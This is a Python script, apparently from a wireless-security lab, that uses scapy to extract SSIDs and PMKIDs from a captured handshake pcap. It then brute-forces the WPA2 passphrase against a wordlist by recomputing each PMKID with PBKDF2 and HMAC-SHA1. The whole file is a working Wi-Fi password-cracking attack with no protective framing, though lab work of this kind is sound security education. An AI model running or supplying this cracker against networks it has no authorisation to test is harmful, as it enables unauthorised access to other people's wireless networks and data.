#!/usr/bin/env python3
# -*- coding: utf-8 -*-

__author__      = "Gabriel Roch & Cassandre Wojciechowski"

from scapy.all import *
from binascii import a2b_hex, b2a_hex
from pbkdf2 import *
import hmac, hashlib


# key: MAC of AP
# value: the SSID
ssids = dict()

# 2d dict
# key1: MAC of AP
# key2: MAC of Client
# value: pmkid read in packet 1 of 4
pmkids = dict()

# Reading the pcap file
cap = rdpcap("PMKID_handshake.pcap")
for p in cap:
    # for beacon, add AP-mac and SSID to variable ssids
    if p.subtype == 8 and p.type == 0:
        if p.addr2 not in ssids:
            ssids[p.addr2] = p.info
        elif ssids[p.addr2] != p.info:
            print("ERROR AP with multiple SSID doesn't supported")
            exit(1)

    # for packet 1 of 4 add AP-mac, Client-mac and pmkid to variable pmkids
    if p.type == 2 and p.subtype == 8 and p.FCfield == "from-DS":
        Clientmac = p.addr1
        APmac = p.addr2

        # if AP-mac isn't present, make a dict() in pmkids
        if APmac in pmkids:
            pmkids[APmac][Clientmac] = raw(p)[-20:-4]
        else:
            pmkids[APmac] = {
                Clientmac: raw(p)[-20:-4]
            }
            
# Attack of pmkid
# ssid: the SSID of wifi
# apmac: The MAC of the AP "FF:FF:FF:FF...."
# clientmac: The MAC of the Client "FF:FF:FF:FF...."
# pmkid (bytes): The pmkid found in packet 1 of 4
# return True if password found
def hack_pmkid(ssid, apmac, clientmac, pmkid):
    apmac = a2b_hex(apmac.replace(':', ''))
    clientmac = a2b_hex(clientmac.replace(':', ''))

    # Read the list of passphrases from a text file
    line = 0
    with open('passphrases.txt') as file :
        for passPhrase in file.readlines() :
            # remove new-line char
            passPhrase = passPhrase.strip()

            # Calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
            pmk = pbkdf2(hashlib.sha1, passPhrase.encode(), ssid, 4096, 32)

            # Calculating a new PMKID from a passphrase
            calc_pmkid = hmac.new(pmk, b"PMK Name" + apmac + clientmac, hashlib.sha1)
            calc_pmkid = calc_pmkid.digest()[:16]

            # show the actual password tested (replace the previous line)
            print("\r[ ] Test password #" + str(line) , ": ", passPhrase, end="")
            line += 1

            # Comparing the PMKID calculated with the one found in the pcap file
            if calc_pmkid == pmkid :
                print("\r[+] PASSPHRASE FOUND : ", passPhrase)
                return True
        print("")
    return False

# True if a password found
hacked = False

# for each AP-mac found in pcap
for apmac in ssids:
    if apmac not in pmkids:
        print("[-] Don't have information to hack the wifi :",  ssids[apmac])
    else:
        # for each Client-mac in packet 1 of 4 with apmac
        for clientmac in pmkids[apmac]:
            print("[+] Hack wifi", ssids[apmac], "with client", clientmac)
            # Apply the attack
            ret = hack_pmkid(ssids[apmac], apmac, clientmac, pmkids[apmac][clientmac])
            if ret:
                hacked = True
                break

# return error code if no password found
if not hacked:
    exit(1)
